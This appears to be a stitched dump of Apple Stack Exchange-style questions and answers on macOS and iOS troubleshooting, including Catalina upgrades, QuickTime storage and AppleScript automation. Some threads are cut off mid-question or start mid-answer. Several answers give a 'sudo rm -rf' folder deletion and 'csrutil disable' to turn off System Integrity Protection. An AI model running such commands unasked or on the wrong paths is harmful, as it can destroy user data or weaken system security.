I currently am using Mac OSX Mojave and I record my screen using Quicktime and it usually stops when the cached recording exceeds what is available on my drive, which is only around 8 GB. I understand the default location for the cached file (which it then prompts you to save afterwards) is located at:\n~/Library/Containers/com.apple.QuickTimePlayerX/Data/Library/Autosave Information/\n\nIs there a way for me to trick my computer into saving it onto an external disk instead? I've seen this post, How do I get QuickTime to store temporary recordings on another drive?, but the answers either involve creating a new user, or it doesn't work in Mojave anymore. Any ideas would be greatly appreciated!\n\nA: For all I know, there might be a macOS setting to change where QT saves screen recordings, but I have not found that.  \nWithout changing the path to the directory where QT writes screen recording files, you can change the directory to a symbolic link to a folder on your external drive.  The symlink acts as if it is a directory, but instead of holding files and using disk space to save files, it links to any directory you can get to through the file system.\nI cannot confirm that you have identified the correct directory where Quicktime saves screen recordings in Mojave.  In Catalina, new screen recordings initially are saved on the desktop.  This is new in Catalina. If for some reason QT is not saving files to the directory you expect, obviously you will have to find the right directory and convert it to a symlink.\nI am assuming you can find your way to the command line via the terminal app. I would guess there is a way to avoid using the command line for setting this up, I am going out on a limb and recommending the command line.\nTo convert a directory at \n~/Library/Containers/com.apple.QuickTimePlayerX/Data/Library/Autosave\\ Information/\n\nto a symlink connected to your external drive, you can try these steps:\n\n\n*\n\n*Setup a folder on your external drive where you want to save screen recordings.  For this write-up, I am calling it \n/Volumes/ext_drive_name/QT_screen_recs\nThe command for that is \n$ mkdir /Volumes/ext_drive_name/QT_screen_recs\n\n\n\n*If there are files you want to keep from  \n~/Library/Containers/com.apple.QuickTimePlayerX/Data/Library/Autosave\\ Information/, \nthey need to be copied or moved into the new directory at /Volumes/ext_drive_name/QT_screen_recs. The command for that is:\nfor copy:  $ cp ~/Library/Containers/com.apple.QuickTimePlayerX/Data/Library/Autosave\\ Information/* /Volumes/ext_drive_name/QT_screen_recs\n\nfor move:  $ mv ~/Library/Containers/com.apple.QuickTimePlayerX/Data/Library/Autosave\\ Information/* /Volumes/ext_drive_name/QT_screen_recs\n\nObviously, you could create the new folder by copying the old one to the new location. The commands are similar to those shown for copy and move, you just skip the mkdir in step 1, and drop the /* at the end of the source element in the commands, something like this:\nfor copy and create new folder in the process:  $ cp ~/Library/Containers/com.apple.QuickTimePlayerX/Data/Library/Autosave\\ Information /Volumes/ext_drive_name/QT_screen_recs\n\nfor move and create new folder in the process:  $ mv ~/Library/Containers/com.apple.QuickTimePlayerX/Data/Library/Autosave\\ Information /Volumes/ext_drive_name/QT_screen_recs\n\n\n\n*Before you can make the symlink, you have to either rename or delete the folder QT has been using. In Catalina, you have to use sudo for these commands. I am not sure if this is needed in Mojave. sudo is used to execute a command with super user privileges.  If you do not use sudo when super user privileges are required, the error message is not always indicative of insufficient permissions.  The error messages can be misleading.  Assuming your account is of type \"administrator,\" to use sudo, you just precede the command with sudo followed by a space.  You will be prompted for your password. You can avoid that by logging in as the root user, but then you run the risk of the directories being owned by the root user instead the account used when recording with QT, causing errors for lack of permissions to write to the directory on the external drive.  \n\n\nWith all that as introduction, you can use these commands for renaming or deleting the default QT directory (I renamed mine, temporarily, then deleted it after every thing with the new setup was working for awhile.\nrename: sudo mv ~/Library/Containers/com.apple.QuickTimePlayerX/Data/Library/Autosave\\ Information ~/Library/Containers/com.apple.QuickTimePlayerX/Data/Library/Autosave\\ Information.backup\n\ndelete sudo rm -rf ~/Library/Containers/com.apple.QuickTimePlayerX/Data/Library/Autosave\\ Information\n\n\n\n*Make the symlink.  The symlink is going to have the exact same path as the original folder you are moving.  This is absolutely critical,  because QT is going to try writing files where it always has, at that path.  If there is no directory or symlink at that path, QT is going to choke.  The command to make the symlink is:\nln -s /Volumes/ext_drive_name/QT_screen_recs ~/Library/Containers/com.apple.QuickTimePlayerX/Data/Library/Autosave\\ Information\nThat command will put the symlink exactly where the directory was that you will have moved to the external drive.\nTo verify it is setup, you can list the directory from the commandline:\n$ cd ~/Library/Containers/com.apple.QuickTimePlayerX/Data/\n$ ls -alF \n\nThe symlink will look like this:\nAutosave Information-> /Volumes/ext_drive_name/QT_screen_recs\n\nAnother way you can see the symlink is through Finder.  Navigate to \n~/Library/Containers/com.apple.QuickTimePlayerX/Data/\n\nYou will see a folder named Autosave Information with a tiny arrow in the lower left corner, indicating it is a link.  \nFinally, when you make screen recording, if you have converted the correct directory, and have the permissions set correctly, you will find the screen recording files on the external drive.\nThis symlink thing is a good trick.  I used it to move most of folders in my home directory, including Downloads, Desktop, Music, and Movies to an external drive, conserve space on the relatively small SSD running as my system drive.\n", "Q: Uninitialized HDD after GPT to MBR conversation, 3 HFS+ Volumes and 1 ExFAT 2 TB External Hard Drive. \nError during converting from GPT to MBR and now Disk can't be mounted. \n'The disk you inserted was not readable by this computer' appears when HDD is plugging in.

Gmail has keyboard shortcuts for seemingly everything (including features I’ve never even used or heard of), but there appears to be no keyboard shortcut to print.\nIt also does not seem possible to make a custom keyboard shortcut to select “Print” either.\nSo far the closest that I’ve come is discovering that when a new message is loaded, I can press ⇧Tab twice to select the “Print” icon, and then press Enter to trigger it. But this completely fails if you have done almost anything after opening the message such as selecting some text, etc. So it is not reliable enough to be useful.\nI’m hoping that someone either knows some JavaScript magic or perhaps there is a Google Chrome extension out there which might make this possible.\n(After this many years of Gmail being around, I have to assume the lack of a keyboard shortcut for printing is intentional. Perhaps someone at Google thinks we ought to be living paperless lifestyles, or they figure if you keep all of your email in Gmail rather than printing them to PDF then you’ll use Gmail more. However, I suppose the ‘why’ really isn’t all that important, but it does seem like a strange oversight. At least to me.)\n\nUpdate:\nI guess I should have been explicitly stated that neither ⌘P nor File » Print will work.\nThat's why Gmail has its own print icon which opens the message in its own window. Otherwise Chrome tries to print out the sidebar and everything else around the message and you won't even see the main message as part of the printed page or PDF.\n\nA: Here is one way that I triggered the Print sheet in Gmail within Google Chrome using a keyboard shortcut:\nDoing this on macOS High Sierra1, in Automator, create a new Service.1\nSet Service receives1 no input in Google Chrome\nAdd a Run AppleScript action, replacing the default code with the following example AppleScript code:\ntell application \"Google Chrome\" to execute front window's active tab ¬\n    javascript \"document.getElementsByClassName('T-I J-J5-Ji T-I-JN L3')[2].click();\"\n\nSave the Service as, e.g.: Google Chrome Gmail Print\n1 In macOS Mojave, and later, an Automator Service is called a Quick Action. There are also other minor nomenclature differences but they should be more obvious when comparing them to pre-macOS Mojave Automator workflows.\n\nAssign the Service a keyboard shortcut in: System Preferences > Keyboard > Shortcuts > Services\nI assigned ⌃⌘P to the e.g. Google Chrome Gmail Print Service.\nNow in Gmail, within Google Chrome, having an email opened showing the print icon, as shown circled in red in the first image below, and I press ⌃⌘P the Gmail Print sheet, as shown in the second image below, is revealed.\n\n\nNote that in the standard view, as shown in the Gmail image above, there are four ElementsByClassName with T-I J-J5-Ji T-I-JN L3 as the class name. Index [0] and [1] are used by the Collapse all icon or Expand all icon that will show, when applicable, to the left of the Print all icon [2] and index [3] is used for the In new window icon to the right of the Print all icon.\n\n\n Note: The example AppleScript code is just that and does not contain any error handling as may be appropriate. The onus is upon the user to add any error handling as may be appropriate, needed or wanted. Have a look at the try statement and error statement in the AppleScript Language Guide. See also, Working with Errors.\n", "Q: How does macOS know when to Automatically Adjust Brightness? I understand the \"Automatically Adjust Brightness\" feature, when enabled, is designed automatically to raise or lower the brightness of e.g. the Macbook's screen depending on whether the surrounding environment is dark or well-lit.\nI am curious what sensor onboard the Macbook laptop is used to detect the amount of light in the room. \nA cursory experiment caused my Macbook's screen to dim when I covered the webcam, even though the webcan was not on, and the green light wasn't lit. Is the Macbook's webcam constantly sensing light levels? I was under the impression that the webcam was wired to prevent the webcam from capturing without illuminating the green LED. \nIf there is some other sensor positioned close to the webcam just for sensing light levels, what is it?\n\nA: There is an ambient light sensor near the webcam (not part of the webcam) that is used for this. If you shine a flashlight on your camera, you'll see it about 75mm right of the camera.\n", "Q: Applescript error -10000 when saving Mail attachments in Mojave 10.4.6 My script for the Mail app saves attachments from each message. It was working fine and suddenly started generating this error in macOS 10.14.6 Mojave:  \n--> error \"To view or change permissions, select the item in the Finder and choose File > Get Info.\" number -10000\n\nThe script line that resulted in this error was:\nsave mail attachment id \"2\" of message id 33167 of mailbox \"Trash Later\" in \"/Volumes/Backup/email attachments/ATT00001.jpg\"\n\nI tried changing the permissions of the target folder using \"chmod 775\" but no luck.\nApple's documentation has this cryptic description of the error:  \n-10000 The Apple event handler failed.\n\nAny suggestions?\n\nA: Following a hunch that it had to do with the steadily increasing new permissions requests, I added the \"Script Editor\" app to this preference:\nSystem Preferences > Security & Privacy > Full Disk Access\nThe error -10000 disappeared and the script is back to saving attachments.\nI'll update if the error returns.\n", "Q: How do I temporarily hide the Picture in Picture window?

I'm struggling to understand why following does not work as expected in bash:\n$ myvar='\"some stuff\"'\n$ echo $myvar\n\"some stuff\"\n$ cd $myvar\nbash: cd: \"some: No such file or directory\n\nI know the canonical way is to (How to use cd with shell variable containing spaces):\n$ myvar=\"some stuff\"\n$ echo $myvar\nsome stuff\n$ cd \"$myvar\"\n\nBut e.g. here https://stackoverflow.com/a/12258418/881191 answer by Alex for macOS advices to escape quotations, which I also tried and it's the same as putting double quotations inside single ones in my case. Why in one case cd gets two parameters and in other two from as I see it same \"some stuff\"?\n\nA: Typically, quotes are strip in a parameter/variable assignment, unless the quotes them self are quoted and they then become part of the string. As in your example \"some stuff\" is the string attached to $myvar. When you issue the command-\ncd $myvar\n\nthe command is broken up into tokens- words and operators. The shell parses them into a command and arguments, then parameter/variable expansion takes place on $myvar. Since $myvar isn't quoted the contents are split into two words (known as field or word splitting) -\n\"some and stuff\"\n\nThus, the error message- bash: cd: \"some: No such file or directory. Since cd only accepts one argument stuff\" is disregarded.\nEven when you quote the variable $myvar it still produces an error message because the directory name is some stuff not \"some stuff\"- \ncd \"$myvar\" \nbash: cd: \"some stuff\": No such file or directory  \n\n", "Q: Warning: Cask 'xxx' is unreadable: undefined method `method_missing_message' for Utils:Module $ /usr/bin/find \"$(brew --prefix)/Caskroom/\"*'/.metadata' -type f -name '*.rb' -print0 | /usr/bin/xargs -0 /usr/bin/perl -i -pe 's/depends_on macos: \\[.*?\\]//gsm;s/depends_on macos: .*//g'\n\n$ brew search metabase\nWarning: Cask 'sqleo' is unreadable: undefined method `method_missing_message' for Utils:Module\nWarning: Cask 'squirrelsql' is unreadable: undefined method `method_missing_message' for Utils:Module\nWarning: Cask 'yiddish-klal' is unreadable: undefined method `method_missing_message' for Utils:Module\n==> Formulae\nmetabase\n\n==> Casks\nmetabase\n\nThe fix from GitHub not working at me (first line).

Mac Mojave 10.14.5 I recently found when using the physics stack exchange site that an unwanted program had installed itself on my Mac. This happened a few times before I managed to isolate the source. In some instances the program was called 'managerpages', and in others 'coveropen'. The behaviour of the program seemed to be the same in both sets of cases-it placed an icon on my dock and appeared as an extension in both safari and chrome. I deleted the  program from application finder and removed the extensions. \nHowever, I now notice a process named 'expertsearchmodule' consuming significant network resources, sending and receiving megabytes of data in a short time period. I have forced it to quit and it restarts.\nCan anyone tell me if this is a bonafide process, or something fishy. If the latter, is there an easy way to expunge processes from my system? I have tried searching for the process on Google but have found very few references to it.\nMany thanks\n\nA: It is definitely not a part of the standard macOS install.\nFrom the name and the story you're telling, it seems very likely that it is malware! \nIt might however be from a legitimate piece of software that you have installed. I would try closing the process down, and check the apps you normally use to see if you have any problems. If this is a legitimate piece of software, you should be able to get the process running again by rebooting.\nIf you did not knowingly install an app that is the \"expert search module\" - then I would recommend disconnecting the system from the internet, take backups (without deleting older backups) - and if at all possible - reinstall the system from scratch from a known-good backup. If that is not possible, use software such as MalwareBytes to track down the offender and remove it from the system.\n", "Q: Boot drive not recognised at all After doing an update for iPad and open Google Chrome to watch streaming movies the MacBook Pro 13 mid 2012 has started to slow down and Chrome closed.\nI restarted and a flashing folder appeared instead of an Apple with a question mark. \nI tried every possible key combination, it no longer detects the hard drive, in the terminal it only sees Apple_HFS Mac OS X Base System and no longer the journal hard drive + HFs. \nI tried to insert the installation CD it says that there is not enough space, I tried to restore from backup but it continues to admit that there is no space, if I start the Mac with USB with OS El Capitan gives me a Panic error. \nCan anyone tell me what commands to execute to restore my Mac?\nI tried also to take it apart and change HD but it always goes out the folder with the question mark, Hard test does not detect any problem. \n\n\n\nA: I'd say the HD had died, but if you tried another drive with no joy, then it may just be the SATA cable that needs replacing.\nThat would be my first recommendation.\nOtherwise take it to a professional.\n", "Q: What is the difference between Full Disk Access and Files & Folders access in Catalina? From security preferences pane we see below info:\nWhat is restricted internally for each of these?\n\nFiles and Folders access: Allow the apps below to access files and folders.\n\n\n\nFull Disk access: Allow the apps below to access data like Mail, Messages, Safari, Home, Time Machine backups and certain administrative settings for all users on this Mac.\n\n\n\nA: Full Disk Access feature is much like a security check at an airport. When you grant “Full Disk Access” to an app it is added to the whitelist of applications that are now marked as safe to work with your data. At the same time, all other applications will be greeted with “You Shall Not Pass.” The protected areas that require Full Disk Access permission are your Mail, Messages, Safari, Home, Time Machine.\nAccording to Apple: “So if your app attempts to access any data that is part of one of the protected categories the system will automatically terminate it.” And by “terminate” Apple really means a forced crash.\nIn the other hand regarding Files and Folders, \nIn macOS 10.15 Catalina, Apple has further extended the number and range of User prompt that can be generated when code attempts to access certain locations and functions.\nIn order to prevent attackers enabling FileVault with a secret key via fdesetup, a possible avenue for a ransomware attack, Apple has introduced a new prompt that requires user approval before FileVault can be used to encrypt the drive programmatically.\nProgrammatic access to user’s Desktop and Documents folders will now also require user approval, as will access to the Downloads folder, iCloud, mounted volumes and cloud storage folders like Dropbox, OneDrive and similar. As on Mojave, the list of approved apps can be viewed and managed in the System Preferences Privacy pane.\nThe prompt takes the form of a message “SomeApp would like to access files in your Desktop folder” with “Don’t Allow” and “OK” as the options; there is no password required for this approval.\nIn brief:\nApps on the Mac will need permission - asked once, when first needed - to access files in your Documents or Desktop folder, in iCloud Drive, and on any external volume connected to your Mac. You'll also be prompted when any app can capture your keystrokes or take a screenshot or video of your screen.\nmacOS will run in its own private, read-only volume, so there will be no way for malicious apps to write files to the volume or alter existing files, or no way for you to accidentally delete key files. The installation of macOS Catalina creates two volumes, one with the operating system, and another with data, segregating the two types of files.\nApple is doubling down on security and privacy, and this is an impressive list of new features. We'll keep you posted as more information about these key features becomes available.\n", "Q: Boot Camp assistant \"Needs more drive space\" even though i have enough Trying to get dual boot for my mac and I ran into this issue.\n\nAnd when I look at my drive status, this is what I see.\n\nSo maybe im doing something wrong but it doesn't seem right that I need \"at least 39GB\" when I have 46GB available\nI do plan on upgrading the storage of this mac soon anyways if I cant get this figured out\n\nA: The 46.1 GB may include what Apple calls \"purgeable\" space. This space can be made available but is not readily so. My suggestion is to clear off more space if possible and try again. I think purgeable space is space occupied by files and folders that haven't been accessed in some time.\n", "Q: Where are Photos projects stored on the drive? I've asked Apple Developer Support, regular Apple Support, and high-level Apple Support. They all said to ask on the Apple Developer Support Forums. I figured I'd ask here as well because I have much better experience on SE.\nI am a senior software engineer working on a Photos Extension. I have multiple machines on which I want to test my code. Photos requires that its Extensions operate through Projects. For instance, one might right-click an album and create a new Book or Calendar. Our Photos Extension properly uses the Photos and PhotosUI APIs to manipulate these projects, and Photos takes care of serializing our changes.\nI am developing Motif for multiple versions of macOS (High Sierra, Mojave, and Catalina). To do so, I have multiple Macs, each with a different OS installed on it.\nOne of the things that I want to fix is a problem that we see when upgrading from Mojave to Catalina. One way I could do this is to install macOS Mojave on one of the Macs, create a project, and then update that Mac to Catalina. This, however, is very time-consuming. Instead, I would like to create a project in Photos on a Mac running macOS Mojave, export that project (say, to a thumb drive), and import it into Photos on a Mac running macOS Catalina.\nSince there is no UI for exporting a project, I want to know where these projects are stored in the filesystem. I intend to then copy those project files (say, via a thumb drive) between Macs in order to perform these tests. Could you please help me achieve this?\n\nA: Here is the official answer from Apple (specifically, Jack, a senior advisor with Apple Developer Program Support):\n\n\nA: I've not yet found the precise location of each project, but I have found that it's stored in the photo library. So, to perform this transfer, I just zip up the library and transfer it over. Doing this I can also have multiple sets of projects to test with, and if I need to, I can revert to an older/primary/specific one at any time.\nI would still like to just move/copy/backup just one project, but as of now this will be my kludge.\n", "Q: Option for Second Alert on Calendar Events Disappeared After Mojave 10.14.6 Update I just updated my Macbook Pro to Mojave 10.14.6 and noticed that I can no longer set a second alert on events I add to my Calendar. I'm not using any external calendars or accounts, just my iCloud. I can still set second alerts on my iPhone, just not my computer. \n\nA: Depends what is your default calendar settings. If you select iCloud Calendar then you will have plus sign option next to the alert.\n\n", "Q: Make volume and brightness sliders stay open on macbook pro touch bar I have already changed the setting in Keyboard Settings for the Touch Bar shows to Expanded Control Strip and I have volume and brightness sliders loaded onto the expanded control strip.\nHowever, I still have to press the button before I slide. Can I make the sliders stay open?\n\nA: Unfortunately, you can't achieve that without any third app.\n\n\n*\n\n*BetterTouchTool is probably the most famous one, and let you customize your TouchBar as you like. You can try it for free for 45 days to see if it suits you.\n\n\nYou can see on the picture below an exemple, with the brightness slider as you want :\n\n\n\n*\n\n*My TouchBar My rules is a BetterTouchTool applike but free, however it's not very user friendly...\n\n\nOn the default preset below, you have both the brightness and volume sliders as you want :\n\n", "Q: How to disable fullscreen system location notifications? I keep getting a disruptive full screen pop up about once a day about Google Maps using location in the background... to save my parking spot, remember restaurants, figure out when I met someone and save travel destinations seamlessly.\n\"Google\" has used your location 4 times in the background over the past 3 days. Do you want to continue to allow background location use?\n\nHow do I stop these intrusive notifications which are a poor use of my time to deal with.\n\n\nA: Unfortunately, you currently cannot turn these off. It may be helpful to send feedback to Apple concerning this.\nIf you really want to stop them, you could go to Privacy > Location Services and disable location services on your devices. You could also go application by application on this list and change all apps that have the permission set to \"Always\" and change them to \"While Using\", but you likely have a reason to have them set to always to begin with.\n", "Q: How do I prevent content refresh on iOS 13? iPhone 7Plus running iOS 13.1.2. \nEver since upgrading to iOS 13 when apps with live feeds refresh it also resets to the top of the feed. So if I am trying to catch up on my Instagram  feed I may get 10 or 15 posts down the list and all of a sudden the feed refreshes and I \"pulled\" back up to the top of the feed. At first I thought this was an issue with the Instagram app but then it happened on the CNN app while reviewing the news. This led me to believe it was related to iOS rather than the specific app.\nIs there a way to adjust or turn this behavior off so that the app does not auto-refresh but relies on pull-to-refresh?\n\nA: There's no global way to do this because it's under control of the app developer.\nEach developer can decide how they want to refresh the data and the view you're seeing.  In these instances, CNN & Instagram developers decided to keep that this was the behaviour they wanted to give you.\nSome developers, for example, Tapbots (maker of Tweetbot), provide an option in the app Settings to allow their users to change this refresh experience.\nBecause there no global setting to control this, you would need to contact the developers of those applications and ask them to include this feature.\n\nA: Curious to follow up on the response from I did a search for background refresh of Instagram and I found out that there is indeed a global setting in iOS:\nGo to Settings  > General > Background App Refresh. \n The locate Instagram (or any other app) and Toggle Background App Refresh \n", "Q: How much space do I need to make a bootable Catalina volume on my Mojave Mac? I'm thinking of installing Catalina on a Volume to test and wondered how much space this new OS will take up on my Mac.\nI'm planning on using APFS Volume so both my main Macintosh HD and User data would stay untouched and just install Catalina to look for now, so please assume I don't need to worry about two copies of my user data or Applications - just the bare OS to install and try booting to look around without running the migration assistant.\nWhat space needs should I plan on needing to install a clean macOS Catalina install with no user data or apps?\n\nA: The installer takes 8.1 GB of space in your Mojave /Applications folder when it downloads the installer to your Mac. \nIn the case where you install to a brand new / empty volume, you will end up with two APFS container volumes - one for the read only system files and another for the user data.\nAPFS Volume Catalina - Data         3.7 GB     disk1s5\nAPFS Volume Catalina                10.8 GB    disk1s6\n\nDoing the math, that's 14 GB of space for a totally empty installation, no third party apps, no user data migrated, no iCloud and just an admin account home folder.\nAdd an additional 8.1 GB of space for the installer and you're able to start testing with as little as 25 GB of free space on Mojave.\nIf you're interested in how this split works in practice - I recommend this article highly.\n\n\n*\n\n*https://eclecticlight.co/2019/10/08/macos-catalina-boot-volume-layout/\n", "Q: What does MacBookProX,Y refer to? The MacBook Pros have long used a codename MacBookProX,Y.\nApparently the X refers roughly to a generation. One generation can possibly span more than one \"early\", \"middle\", \"late\" period of one year, or indeed may span more than one year.\nThe Y seems to distinguish screen size. It used to be that the Y increased with screen size.

Even further access to system files can be had by disabling SIP (System Integrity Protection) - although I would not recommend leaving it disabling in general.\nYou can enable Full Disk Access by opening System Preferences > Security & Privacy, and then under the \"Privacy\" tab select \"Full Disk Access\". After unlocking, drag Terminal.app into the list to give it full disk access.\nSIP can be disabled by booting into Recovery Mode (reboot with Cmd+R held down), and then opening Terminal.app and running the following command:\ncsrutil disable\n\nWhen you reboot, your Mac will start up with SIP disabled.

It guarantees you can either activate the device and it’s working well enough for a passcode to be set and doesn’t erode your privacy in any manner.\nI’d indulge the buyer to see what they want. You could still be scammed and not get payment or have the buyer say they didn’t get the phone - so you’ll want traceable delivery / shipment or be willing to get a claim you didn’t provide the goods.\nBut, the passcode is neither here nor there in my eyes as making a transaction risky or safe.\n", "Q: macOS Catalina installer freezes just after choosing disk I'm trying to install macOS Catalina. Currently I have Mojave, macbook pro 13\", mid 2012. System suggested this upgrade so I decided to install it right away :)\nWhen Catalina installer started it asked about accepting license and then to choose disk. After that beachball of death appears i.e. the installer process is frozen (and is marked red in Activity Monitor).\nAfter 30m I force killed this process and retried 3 times, so far.\nHow can I determine what is slowing or stopping my installation?\n\nA: I found a fix for me.\nSomething told me that a disabled Spotlight might be the reason (I had similar issue long time ago and re-enabling Spotlight did the job).\nIf you have Spotlight disabled, then re-enable it using this in Terminal:\nsudo launchctl load -w /System/Library/LaunchDaemons/com.apple.metadata.mds.plist\n\nAfter installation you can disable it once again :) Hope it helps someone.\n*Can also make this change in System Preferences > Spotlight > Privacy = Then drag and drop the HDD into the window (enable the hard disks option in the Finder Preferences->Sidebar if the HDD is not visible in the Finder). To undo the action, just click on the hdd, and select the minus symbol.

I thought I knew how to do it, because Catalina is the original OS for my Mac.\nThe first install got stuck two minutes before finishing. I quit the installer (what a waste of an hour and a half) and tried again. I got endless error messages, so I quit it again. Third time I just left it to get on with it and ignored the errors. It did it. Makes me wonder if it hadn't got stuck at 2 minutes after all.\nSo basically, I just left it to get on with the job. It was scary, though--I didn't know if it was going to do it or not.\nTo make sure your Mac knows who's in charge here, give it a stern talking-to. Then leave it and just think to yourself, \"It is going to do it this time. It is going to do it this time.\"\nGood luck :-)\n", "Q: Updated to ios13; got black font Having recently updated to ios 13 the app labels are now black, along with the lock screen clock, date, etc. How does one change the color back to white?

Correct me if I'm wrong:\n\"You cannot remote into an iOS device from a computer\".  \nI heard this is the case.  I tried Chrome Remote and it works from iOS remoting a computer, but I couldn't remote into the iOS device from my Mac (I mean, use my computer to remotely access the iOS device).\nI wonder if there's any remote software for this.\nThanks in advance.\n\nA: If you consider a non-jailbroken iOS device, there's basically two types of remote software possible:\nThe first type lets you remote in to see what's on the screen in \"real time\". It works across apps, and even when you're on the home screen, in control center, etc. The main drawback is that you can only watch what's happening - you cannot control anything. A common system that implements this scheme is TeamViewer.\nThe second type lets you remote in to see what's on the screen in \"real time\" and also allows remote control (and possible various other actions such as \"painting\" on the screen, popping up messages, etc). The main drawback being that it only works inside a single app - as soon as you exit the app, the remote connection stops. Several vendors offer SDK based solutions for this type of remoting - but you have to be an app developer to embed it inside your own app. You cannot apply it to any random app you have installed.\n", "Q: How to use OSX built in VNC client to connect to localhost with port forwarding I already have ssh port forwarding set up, and it works with Chicken of the VNC, host set to 'localhost' and port set to the port I have forwarded.\nSoon, I won't be able to use Chicken, because the latest OSX version, Catalina, won't let it run because it is a 32bit app.\nI've tried to do the same with Screen Sharing, connecting with vnc://localhost:XXXX, but then it asks for a password, which it shouldn't need, and doesn't connect.

I'm running OS X 10.8 on an iMac which is from 2008, and I can't seem to boot into recovery mode. Command-r doesn't do anything- the computer simply boots normally every time. Although OS X 10.8 certainly does support recovery mode, I'm wondering if the problem might be that I'm using an iMac that was built before the feature was added to OS x (it was added with 10.7 Lion in 2011, my iMac is from 2008). Is it possible that the hardware is preventing me from booting into recovery mode, or is it solely a feature of the operating system, and should work on older iMacs as well?\n\nA: I believe the issue is that recovery mode was introduced in 2011, you are indeed correct.\nIf you have access to another Mac you could create a bootable macOS installer and boot from that\n", "Q: Mac stuck in restart cycle after failed macOS Catalina update I'm extremely worried about my MacBook. I tried updating to the official release of macOS Catalina a few hours ago but instantly hit a problem. I have not installed any beta releases beforehand.\nI downloaded the updated and selected my drive as the install location. After a few minutes of the update seeming to go as normal, I was thrown a screen which said something like \"macOS could not be updated on your Mac, there is not enough free space\". It gave me the option to restart so I did that, hoping that I'd be able to log in and clear some more space for the install.\nHowever, I restarted, entered my password then it seemed like the update instantly resumed. A few minutes later, the same error popped up so I pressed restart once more and the same cycle happened again. \nFrustrated, I tried the obvious booting into recovery mode and selecting my main drive as the startup disk but whilst I was able to enter recovery mode, I wasn't able to select the disk - it didn't appear. I also tried booting into safe mode with no success.\nI have done a lot of googling and most guides say something like \"restart, log in and free up some space\". The issue is, I can't log in. When I try to, it chucks me back into the update and the process repeats.\nI would greatly appreciate it if someone could help me out - this issue is really concerning as I'm currently unable to use my MacBook and really need it for my studies.\n\nA: I was facing the same issue and was on the verge of reformatting my macbook.\nHere's what fixed the issue for me. I'm not sure if step one was necessary, but since I did this en route to fixing the loop of death, I'll list it here for you to consider. \n\n\n*\n\n*Try to reinstall Mojave (this won't wipe your disk) - I wanted to return my macbook to as original a condition as possible, and I figured attempting to install Mojave was the best way to do it. Since I couldn't boot from \"Macintosh HD\" anymore (I was just getting a white circle with a bar across it), I rebooted my macbook and pressed Cmd + r. This helped me boot into recovery mode. Once there, I clicked on \"Reinstall macOS\". Don't worry, you won't lose your data doing this as it merely overwrites the OS, it doesn't overwrite your files. Once you do so, and assuming you're connected to Wifi, your macbook will start downloading Mojave and eventually attempt to install it. After an agonizing 30-40 minutes, it'll give you the same error - \"not enough free space to install the OS\".\n\n*Try restoring from Time Machine Backups (you might actually have one) - I cannot emphasize how strongly I believed I didn't have one of these backups, but unbeknownst to me, it did exist on my drive. Even if you're convinced you don't have one, it doesn't hurt to give this a shot. Reboot and go into recovery mode again (press cmd + r during reboot). This time when the options pull up, choose \"Restore from Time Machine Backup\". Now, as I mentioned before, I thought I hadn't got this turned on, but I guess it was turned on by default by the OS. Your macbook will prompt you to pick a disk where the time machines are stored, and I picked \"Macintosh HD\". When I clicked this option, I saw about 5 backups populate from today itself. I picked one of them that felt fairly far away from the moment I had began installing this OS. For example, if I started my installation at 4pm, I decided to pick up the recovery from 2pm (even though there was a backup available from 4 pm). \nIt took all of 5 minutes for the backup to be restored. And all my files were intact, even though I had explicitly moved out/deleted about 30G of files while trying to debug the installation issue. \nGodspeed.\n\nA: I had the same problem yesterday on a 2013 Macbook Air and was able to restore a Time Machine backup.\nThe update failed due to limited space, but it wasn't able to boot into Mojave anymore because it couldn't find a bootable disk anymore.\nI tried freeing up space by manually moving the iTunes folder (~20GB) to an external drive from the terminal, but somehow it did not seem to see the extra space. It kept complaining about too little storage space (the disk repair tool saw only 11GB available).\nI Tried TA's solution:\n\n\n*\n\n*The reinstall of Mojave failed, again because of free space issues.\n\n*Then I tried to restore a Time Machine backup and also found a backup from just before the update which I hadn't expected. This restore was finished in 2 minutes and Mojave was up and running as if nothing had happened.\n\n\nThe next step is to make another backup, clear out even more space and re-try the update. Fingers crossed!\nEdit:\nAfter restoring Mojave and clearing up enough space the update was succesful. \n\nA: macOS High Sierra (10.13) or later have an APFS file system which does disk state snapshots which are accessible as Time Machine backup.\nThat means what in case of restart loop because of lack of free space you need to boot into recovery mode by holding Cmd + R right after machine starts, and go into Restore from Time Machine Backup there: you will have local time machine backups and will be able to restore system to its state just before the upgrade.\nYou don't need an external disk with Time Machine copy to do that, APFS does this for you automatically.\nDeleting a file from APFS from recovery mode would not free any disk space because of the snapshot system, mentioned above.\n\nA: I ran into the same problem yesterday with zero help from a senior advisor despite opening a ticket with engineering.\nI finally resolved it by: Downloading (but not installing) Catalina on another Mac and copying the install file (big!) to an external drive. I then booted the stuck Mac to an external drive I have running High Sierra, wiped and reformatted the stuck drive, then installed Catalina from scratch. This worked, and then restored from Time Machine backup; only way I was able to get around this issue without reverting to Mojave.\nAlso if you come across and issue where it won’t open your TM backup because there “aren’t any volumes” skip the usual restore process and set up as new. Create an dummy account and login; then open your TM backup so the disk image is mounted in the Finder. Only then you can run the Migration Utility and it will be able to restore from your backup.\nComplete nightmare but finally upgrade completed; definitely not doing my other Mac for a while.\n\nA: I followed TA's answer above although I only did step 2 - restore from Time Machine. And that seems to have worked so far.\nIt took about 2 hours to restore 200GB, and it was a bit nerve wracking since I had to erase my HD before doing the restore (maybe this wouldn't have been necessary had I followed step 1 and reinstalled Mojave). I thought I had plenty of space before I tried the Catalina upgrade. I had just deleted (and emptied trash) of about 50GB of Xcode device support files. So I don't understand why Catalina had the space issue for me. I'd also been reindexing Spotlight and turning off Filevault prior to the Catalina issue so maybe those were contributing factors. One tip that may be really useful for people is that if you have a wireless mac keyboard, Command R to get into recovery mode might not be easy for you to initiate. I resolved this little \"gotcha\" by plugging my keyboard directly into my mac. \n\nA: Also discussed and resolved here: \n\n\n*\n\n*How can I free up space to reinstall macOS (Catalina)? \n\n*https://discussions.apple.com/thread/250711825?cid=em_apple_email_question_correctanswer_go_to_the_discussion_en-us&answerId=251355788022#251355788022\n", "Q: Easiest way to migrate aliases from bash to zsh I want to start using zsh as recommended by Apple for Mac OS Catalina.

